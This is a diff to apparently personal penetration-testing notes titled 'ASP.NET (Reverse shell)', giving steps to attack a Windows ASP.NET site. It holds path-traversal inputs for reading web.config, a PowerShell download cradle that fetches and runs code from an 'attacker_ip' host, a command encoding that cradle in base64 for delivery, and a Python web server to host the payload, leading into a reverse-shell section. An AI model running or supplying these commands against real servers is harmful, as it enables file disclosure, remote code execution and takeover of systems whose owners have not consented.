@@ -1,4 +1,4 @@
-# ASP.NET 
+# ASP.NET  ( Reverse shell )
 Dotnet is used in the windows compatible website server. formate like  ".aspx" 
 # steps
 1. Find the web.config file in website
@@ -9,8 +9,8 @@ Dotnet is used in the windows compatible website server. formate like  ".aspx"
 
 # Find the web.config file in websites
 ```language
-=../../web.config
-=..././web.config    # some time this dots are skiped
+= ../../web.config
+= ..././web.config    # some time this dots are skiped
 ```
 # Read the web.config file
 ```langauge
@@ -36,6 +36,7 @@ nano cradle
 cradle content:-  IEX(New-Object Net.WebClient).downloadString("http://attacker_ip:8000")
 
 cat cradle | iconv -t utf-16le | base64 -w0; echo
+python3 -m http.server 8000
 ```
 # Generate a Reverse Shell
 ```language
